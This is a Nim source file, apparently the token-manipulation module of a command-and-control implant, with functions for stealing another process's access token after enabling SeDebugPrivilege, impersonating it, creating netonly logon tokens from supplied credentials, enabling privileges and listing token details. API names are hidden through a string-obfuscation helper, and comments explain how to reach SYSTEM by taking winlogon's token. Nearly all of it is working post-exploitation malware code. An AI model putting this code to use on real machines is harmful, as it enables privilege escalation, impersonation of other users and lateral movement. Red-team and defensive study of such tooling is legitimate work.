import winim/lean 
import strformat
import ../../common/[types, utils]

#[
    Token impersonation & manipulation 

    Resources: 
    - https://maldevacademy.com/new/modules/57
    - https://www.nccgroup.com/research-blog/demystifying-cobalt-strike-s-make_token-command/ 
    - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Token.c
    - https://github.com/itaymigdal/Nimbo-C2/blob/main/Nimbo-C2/agent/windows/utils/token.nim
    - Windows System Programming Security on INE (Pavel Yosifovich)
]#

# APIs
type 
    NtQueryInformationToken = proc(hToken: HANDLE, tokenInformationClass: TOKEN_INFORMATION_CLASS, tokenInformation: PVOID, tokenInformationLength: ULONG, returnLength: PULONG): NTSTATUS {.stdcall.}
    NtOpenThreadToken = proc(threadHandle: HANDLE, desiredAccess: ACCESS_MASK, openAsSelf: BOOLEAN, tokenHandle: PHANDLE): NTSTATUS {.stdcall.}
    NtOpenProcessToken = proc(processHandle: HANDLE, desiredAccess: ACCESS_MASK, tokenHandle: PHANDLE): NTSTATUS {.stdcall.}
    ConvertSidToStringSidA = proc(sid: PSID, stringSid: ptr LPSTR): NTSTATUS {.stdcall.}
    NtSetInformationThread = proc(hThread: HANDLE, threadInformationClass: THREADINFOCLASS, threadInformation: PVOID, threadInformationLength: ULONG): NTSTATUS {.stdcall.}
    NtDuplicateToken = proc(existingTokenHandle: HANDLE, desiredAccess: ACCESS_MASK, objectAttributes: POBJECT_ATTRIBUTES, effectiveOnly: BOOLEAN, tokenType: TOKEN_TYPE, newTokenHandle: PHANDLE): NTSTATUS {.stdcall.}
    NtAdjustPrivilegesToken = proc(hToken: HANDLE, disableAllPrivileges: BOOLEAN, newState: PTOKEN_PRIVILEGES, bufferLength: ULONG, previousState: PTOKEN_PRIVILEGES, returnLength: PULONG): NTSTATUS {.stdcall.}
    NtClose = proc(handle: HANDLE): NTSTATUS {.stdcall.}
    NtOpenProcess = proc(hProcess: PHANDLE, desiredAccess: ACCESS_MASK, oa: PCOBJECT_ATTRIBUTES, clientId: PCLIENT_ID): NTSTATUS {.stdcall.}

    Apis = object
        NtOpenProcessToken: NtOpenProcessToken
        NtOpenThreadToken: NtOpenThreadToken
        NtQueryInformationToken: NtQueryInformationToken
        ConvertSidToSTringSidA: ConvertSidToSTringSidA
        NtSetInformationThread: NtSetInformationThread
        NtDuplicateToken: NtDuplicateToken
        NtClose: NtClose
        NtAdjustPrivilegesToken: NtAdjustPrivilegesToken 
        NtOpenProcess: NtOpenProcess

proc initApis(): Apis = 
    let hNtdll = GetModuleHandleA(protect("ntdll"))

    result.NtOpenProcessToken = cast[NtOpenProcessToken](GetProcAddress(hNtdll, protect("NtOpenProcessToken")))
    result.NtOpenThreadToken = cast[NtOpenThreadToken](GetProcAddress(hNtdll, protect("NtOpenThreadToken")))
    result.NtQueryInformationToken = cast[NtQueryInformationToken](GetProcAddress(hNtdll, protect("NtQueryInformationToken")))
    result.ConvertSidToStringSidA = cast[ConvertSidToStringSidA](GetProcAddress(GetModuleHandleA(protect("advapi32.dll")), protect("ConvertSidToStringSidA")))
    result.NtSetInformationThread = cast[NtSetInformationThread](GetProcAddress(hNtdll, protect("NtSetInformationThread")))
    result.NtDuplicateToken = cast[NtDuplicateToken](GetProcAddress(hNtdll, protect("NtDuplicateToken")))
    result.NtClose = cast[NtClose](GetProcAddress(hNtdll, protect("NtClose")))
    result.NtAdjustPrivilegesToken = cast[NtAdjustPrivilegesToken](GetProcAddress(hNtdll, protect("NtAdjustPrivilegesToken")))
    result.NtOpenProcess = cast[NtOpenProcess](GetProcAddress(hNtdll, protect("NtOpenProcess")))
    
const 
    CURRENT_PROCESS = cast[HANDLE](-1)
    CURRENT_THREAD = cast[HANDLE](-2)

proc getCurrentToken*(desiredAccess: ACCESS_MASK = TOKEN_QUERY): HANDLE = 
    let apis = initApis() 

    var 
        status: NTSTATUS = 0
        hToken: HANDLE 

    # https://ntdoc.m417z.com/ntopenthreadtoken, token-info fails with error ACCESS_DENIED if OpenAsSelf is set to
    status = apis.NtOpenThreadToken(CURRENT_THREAD, desiredAccess, TRUE, addr hToken)
    if status != STATUS_SUCCESS:
        status = apis.NtOpenProcessToken(CURRENT_PROCESS, desiredAccess, addr hToken)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, protect("NtOpenProcessToken ") & $status.toHex())

    return hToken

proc sidToString(apis: Apis, sid: PSID): string = 
    var stringSid: LPSTR 
    discard apis.ConvertSidToStringSidA(sid, addr stringSid)
    return $stringSid

proc sidToName(apis: Apis, sid: PSID): string = 
    var 
        usernameSize: DWORD = 0
        domainSize: DWORD = 0
        sidType: SID_NAME_USE
    
    # Retrieve required sizes
    discard LookupAccountSidW(NULL, sid, NULL, addr usernameSize, NULL, addr domainSize, addr sidType)
    
    var username = newWString(int(usernameSize) + 1)
    var domain = newWString(int(domainSize) + 1)
    if LookupAccountSidW(NULL, sid, username, addr usernameSize, domain, addr domainSize, addr sidType) == TRUE:
        return $domain[0 ..< int(domainSize)] & "\\" & $username[0 ..< int(usernameSize)]
    return ""

proc privilegeToString(apis: Apis, luid: PLUID): string =
    var privSize: DWORD = 0

    # Retrieve required size
    discard LookupPrivilegeNameW(NULL, luid, NULL, addr privSize)   

    var privName = newWString(int(privSize) + 1)
    if LookupPrivilegeNameW(NULL, luid, privName, addr privSize) == TRUE: 
        return $privName[0 ..< int(privSize)]
    return ""

#[
    Retrieve and return information about an access token
]#
proc getTokenStatistics(apis: Apis, hToken: HANDLE): tuple[tokenId, tokenType: string] = 
    var
        status: NTSTATUS = 0
        returnLength: ULONG = 0
        pStats: TOKEN_STATISTICS

    status = apis.NtQueryInformationToken(hToken, tokenStatistics, addr pStats, cast[ULONG](sizeof(pStats)), addr returnLength)
    if status != STATUS_SUCCESS: 
        raise newException(CatchableError, protect("NtQueryInformationToken - Token Statistics ") & $status.toHex())

    let 
        tokenType = if cast[TOKEN_TYPE](pStats.TokenType) == tokenPrimary: protect("Primary") else: protect("Impersonation")
        tokenId = cast[uint32](pStats.TokenId).toHex()

    return (tokenId, tokenType)

proc getTokenUser(apis: Apis, hToken: HANDLE): tuple[username, sid: string] = 
    var
        status: NTSTATUS = 0
        returnLength: ULONG = 0
        pUser: PTOKEN_USER

    status = apis.NtQueryInformationToken(hToken, tokenUser, NULL, 0, addr returnLength)
    if status != STATUS_SUCCESS and status != STATUS_BUFFER_TOO_SMALL:
        raise newException(CatchableError, protect("NtQueryInformationToken - Token User [1] ") & $status.toHex())
    
    pUser = cast[PTOKEN_USER](LocalAlloc(LMEM_FIXED, returnLength))
    if pUser == NULL:
        raise newException(CatchableError, $GetLastError())
    defer: LocalFree(cast[HLOCAL](pUser))
    
    status = apis.NtQueryInformationToken(hToken, tokenUser, cast[PVOID](pUser), returnLength, addr returnLength)
    if status != STATUS_SUCCESS:
        raise newException(CatchableError, protect("NtQueryInformationToken - Token User [2] ") & $status.toHex())
    
    return (apis.sidToName(pUser.User.Sid), apis.sidToString(pUser.User.Sid))

proc getTokenElevation(apis: Apis, hToken: HANDLE): bool = 
    var 
        status: NTSTATUS = 0
        returnLength: ULONG = 0
        pElevation: TOKEN_ELEVATION 
    
    status = apis.NtQueryInformationToken(hToken, tokenElevation, addr pElevation, cast[ULONG](sizeof(pElevation)), addr returnLength)
    if status != STATUS_SUCCESS: 
        raise newException(CatchableError, protect("NtQueryInformationToken - Token Elevation ") & $status.toHex())

    return cast[bool](pElevation.TokenIsElevated)

proc getTokenGroups(apis: Apis, hToken: HANDLE): string = 
    var
        status: NTSTATUS = 0
        returnLength: ULONG = 0
        pGroups: PTOKEN_GROUPS

    status = apis.NtQueryInformationToken(hToken, tokenGroups, NULL, 0, addr returnLength)
    if status != STATUS_SUCCESS and status != STATUS_BUFFER_TOO_SMALL:
        raise newException(CatchableError, protect("NtQueryInformationToken - Token Groups [1] ") & $status.toHex())
    
    pGroups = cast[PTOKEN_GROUPS](LocalAlloc(LMEM_FIXED, returnLength))
    if pGroups == NULL:
        raise newException(CatchableError, $GetLastError())
    defer: LocalFree(cast[HLOCAL](pGroups))
    
    status = apis.NtQueryInformationToken(hToken, tokenGroups, cast[PVOID](pGroups), returnLength, addr returnLength)
    if status != STATUS_SUCCESS:
        raise newException(CatchableError, protect("NtQueryInformationToken - Token Groups [2] ") & $status.toHex())

    let 
        groupCount = pGroups.GroupCount
        groups = cast[ptr UncheckedArray[SID_AND_ATTRIBUTES]](addr pGroups.Groups[0])

    result &= fmt"Group memberships ({groupCount})" & "\n"
    for i, group in groups.toOpenArray(0, int(groupCount) - 1): 
        result &= fmt" - {apis.sidToString(group.Sid):<50} {apis.sidToName(group.Sid)}" & "\n"

proc getTokenPrivileges(apis: Apis, hToken: HANDLE): string = 
    var
        status: NTSTATUS = 0
        returnLength: ULONG = 0
        pPrivileges: PTOKEN_PRIVILEGES
        
    status = apis.NtQueryInformationToken(hToken, tokenPrivileges, NULL, 0, addr returnLength)
    if status != STATUS_SUCCESS and status != STATUS_BUFFER_TOO_SMALL:
        raise newException(CatchableError, protect("NtQueryInformationToken - Token Privileges [1] ") & $status.toHex())
    
    pPrivileges = cast[PTOKEN_PRIVILEGES](LocalAlloc(LMEM_FIXED, returnLength))
    if pPrivileges == NULL:
        raise newException(CatchableError, $GetLastError())
    defer: LocalFree(cast[HLOCAL](pPrivileges))
    
    status = apis.NtQueryInformationToken(hToken, tokenPrivileges, cast[PVOID](pPrivileges), returnLength, addr returnLength)
    if status != STATUS_SUCCESS:
        raise newException(CatchableError, protect("NtQueryInformationToken - Token Privileges [2] ") & $status.toHex())

    let 
        privCount = pPrivileges.PrivilegeCount
        privs = cast[ptr UncheckedArray[LUID_AND_ATTRIBUTES]](addr pPrivileges.Privileges[0])

    result &= fmt"Privileges ({privCount})" & "\n"
    for i, priv in privs.toOpenArray(0, int(privCount) - 1):
        let enabled = if priv.Attributes and SE_PRIVILEGE_ENABLED: "Enabled" else: "Disabled" 
        result &= fmt" - {apis.privilegeToString(addr priv.Luid):<50} {enabled}" & "\n"


proc getTokenInfo*(hToken: HANDLE): string = 
    let apis = initApis() 

    let (tokenId, tokenType) = apis.getTokenStatistics(hToken)
    result &= fmt"TokenID:  0x{tokenId}" & "\n"
    result &= fmt"Type:     {tokenType}" & "\n"
 
    let (username, sid) = apis.getTokenUser(hToken)
    result &= fmt"User:     {username}" & "\n"
    result &= fmt"SID:      {sid}" & "\n"
    
    let isElevated = apis.getTokenElevation(hToken)
    result &= fmt"Elevated: {$isElevated}" & "\n"

    result &= apis.getTokenGroups(hToken    )
    result &= apis.getTokenPrivileges(hToken)

#[
    Impersonate token 
    - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Token.c#L1281
]#
proc impersonate*(apis: Apis, hToken: HANDLE) = 
    var 
        status: NTSTATUS
        qos: SECURITY_QUALITY_OF_SERVICE
        oa: OBJECT_ATTRIBUTES 
        impersonationToken: HANDLE = 0
        returnLength: ULONG = 0
        duplicated: bool = false 

    if apis.getTokenStatistics(hToken).tokenType == protect("Primary"): 
        # Create a duplicate impersonation token
        qos.Length = cast[DWORD](sizeof(SECURITY_QUALITY_OF_SERVICE))
        qos.ImpersonationLevel = securityImpersonation
        qos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING
        qos.EffectiveOnly = FALSE 

        oa.Length = cast[DWORD](sizeof(OBJECT_ATTRIBUTES))
        oa.RootDirectory = 0
        oa.ObjectName = NULL 
        oa.Attributes = 0
        oa.SecurityDescriptor = NULL 
        oa.SecurityQualityOfService = addr qos
        
        status = apis.NtDuplicateToken(hToken, TOKEN_IMPERSONATE or TOKEN_QUERY, addr oa, FALSE, tokenImpersonation, addr impersonationToken)
        if status != STATUS_SUCCESS: 
            raise newException(CatchableError, protect("NtDuplicateToken ") & $status.toHex())

    else: 
        # Use the original token if it is already an impersonation token
        impersonationToken = hToken

    # Impersonate the token in the current thread (ImpersonateLoggedOnUser)
    status = apis.NtSetInformationThread(CURRENT_THREAD, threadImpersonationToken, addr impersonationToken, cast[ULONG](sizeof(HANDLE)))
    if status != STATUS_SUCCESS: 
        raise newException(CatchableError, protect("NtSetInformationThread ") & $status.toHex())

    defer: discard apis.NtClose(impersonationToken)            

#[
    Revert to original access token
    RevertToSelf() API implemented using Native API
]#
proc rev2self*() =
    let apis = initApis() 
    
    var 
        status: NTSTATUS = 0
        hToken: HANDLE = 0 

    status = apis.NtSetInformationThread(CURRENT_THREAD, threadImpersonationToken, addr hToken, cast[ULONG](sizeof(HANDLE)))
    
    if status != STATUS_SUCCESS: 
        raise newException(CatchableError, protect("RevertToSelf ") & $status.toHex())        

#[
    Create a new access token from a username, password and domain name triplet.
    Using LOGON32_LOGON_NEW_CREDENTIALS creates a netonly security context (same as using runas.exe /netonly)
    This means that nothing changes locally, the user returned by "getTokenOwner" is the same as the current user. 
    In the network, we are represented by the credentials of the user we created the token for, allowing us to inject Kerberos tickets, etc. to impersonate that user.
    The LOGON32_LOGON_NEW_CREDENTIALS logon type does not validate credentials.

    Using other logon types (https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types) 
    changes the output of the getTokenOwner function. The credentials are then validated by the LogonUserA function. 
]#
proc makeToken*(username, password, domain: string, logonType: DWORD = LOGON32_LOGON_NEW_CREDENTIALS): string = 
    let apis = initApis()
    
    if username == "" or password == "" or domain == "": 
        raise newException(CatchableError, protect("Invalid format."))

    rev2self() 

    var hToken: HANDLE 
    let provider: DWORD = if logonType == LOGON32_LOGON_NEW_CREDENTIALS: LOGON32_PROVIDER_WINNT50 else: LOGON32_PROVIDER_DEFAULT
    if LogonUserA(username, domain, password, logonType, provider, addr hToken) == FALSE:
        raise newException(CatchableError, $GetLastError())
    defer: discard apis.NtClose(hToken)
    
    apis.impersonate(hToken)

    return apis.getTokenUser(hToken).username

proc enablePrivilege*(privilegeName: string, enable: bool = true): string = 
    let apis = initApis()

    var 
        status: NTSTATUS = 0
        tokenPrivs: TOKEN_PRIVILEGES
        oldTokenPrivs: TOKEN_PRIVILEGES
        luid: LUID 
        returnLength: DWORD

    let hToken = getCurrentToken(TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY) 
    defer: discard apis.NtClose(hToken)

    if LookupPrivilegeValueW(NULL, newWideCString(privilegeName), addr luid) == FALSE: 
        raise newException(CatchableError, $GetLastError())

    # Enable privilege
    tokenPrivs.PrivilegeCount = 1
    tokenPrivs.Privileges[0].Luid = luid 
    tokenPrivs.Privileges[0].Attributes = if enable: SE_PRIVILEGE_ENABLED else: 0

    status = apis.NtAdjustPrivilegesToken(hToken, FALSE, addr tokenPrivs, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), addr oldTokenPrivs, addr returnLength)
    if status != STATUS_SUCCESS: 
        raise newException(CatchableError, protect("NtAdjustPrivilegesToken ") & $status.toHex())        

    let action = if enable: protect("Enabled") else: protect("Disabled")
    return fmt"{action} {apis.privilegeToString(addr luid)}."

#[
    Steal the access token of a remote process and impersonate it
    This requires SYSTEM privileges to work reliably. Even running as a regular Administrator user might not be sufficient to steal access tokens of other processes
    A work-around is to impersonate NT AUTHORITY\SYSTEM first by stealing the token of a process like winlogon.exe, and then using this token to steal other user's tokens 
]#
proc stealToken*(pid: int): string = 
    let apis = initApis() 
    
    var 
        status: NTSTATUS
        hProcess: HANDLE 
        hToken: HANDLE 
        clientId: CLIENT_ID 
        oa: OBJECT_ATTRIBUTES

    # Enable the SeDebugPrivilege in the current token
    # This privilege is required in order to duplicate and impersonate the access token of a remote process
    discard enablePrivilege(protect("SeDebugPrivilege"))

    InitializeObjectAttributes(addr oa, NULL, 0, 0, NULL)
    clientId.UniqueProcess = cast[HANDLE](pid)
    clientId.UniqueThread = 0

    # Open a handle to the target process
    status = apis.NtOpenProcess(addr hProcess, PROCESS_QUERY_INFORMATION, addr oa, addr clientId)
    if status != STATUS_SUCCESS: 
        raise newException(CatchableError, protect("NtOpenProcess ") & $status.toHex())
    defer: discard apis.NtClose(hProcess)

    # Open a handle to the primary access token of the target process
    status = apis.NtOpenProcessToken(hProcess, TOKEN_DUPLICATE or TOKEN_ASSIGN_PRIMARY or TOKEN_QUERY, addr hToken)
    if status != STATUS_SUCCESS: 
        raise newException(CatchableError, protect("NtOpenProcessToken ") & $status.toHex())
    defer: discard apis.NtClose(hToken)

    apis.impersonate(hToken)

    return apis.getTokenUser(hToken).username